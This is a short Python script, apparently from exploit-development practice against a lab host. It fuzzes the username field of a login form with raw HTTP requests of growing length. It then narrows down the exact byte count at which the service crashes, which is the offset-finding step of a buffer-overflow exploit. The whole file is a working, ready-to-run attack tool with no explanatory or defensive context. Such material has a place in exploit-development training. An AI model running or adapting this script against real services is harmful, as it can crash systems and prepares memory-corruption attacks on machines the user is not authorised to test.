import socket
import time
from urllib.parse import urlencode

def make_request(offset):
	try:
		data = urlencode({"username": "A" * offset, "password": "user"})
		headers = (
			"POST /login HTTP/1.1\r\n"
			"Host: 192.168.153.131\r\n"
			"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\n"
			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
			"Accept-Language: en-US,en;q=0.5\r\n"
			"Accept-Encoding: gzip, deflate\r\n"
			"Content-Type: application/x-www-form-urlencoded\r\n"
			f"Content-Length: {len(data)}\r\n"
			"Origin: http://192.168.153.131\r\n"
			"Connection: keep-alive\r\n"
			"Referer: http://192.168.153.131/login\r\n"
			"Upgrade-Insecure-Requests: 1\r\n"
			"\r\n"
		)
		time.sleep(0)
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect(("192.168.153.131", 80))
		sock.send(headers.encode() + data.encode())
		print(sock.recv(1024).decode())
		sock.close()
	except:
		print("Connection Reset after : {} offset !!".format(len(data)))
		raise

def real_offset_number():
	c = 0
	for i in range((offset_number - 101), offset_number):
		try:
			c += 1
			print((offset_number - 101) + c)
			make_request((offset_number - 101) + c)
		except:
			print("Exact Offset is : {} !!".format((offset_number - 101) + c))
			raise
			


service = input("Enter 1 or 2 '1 for nearly offset number' '2 for exact offset number' : ")

if int(service) == 1:
    for i in range(1, 20):
        try:
            make_request(100 * i)
        except:
            break

elif int(service) == 2:
    offset_number = int(input("Enter nearly offset number: "))
    try:
        real_offset_number()
    except:
        LOL = 101

del service
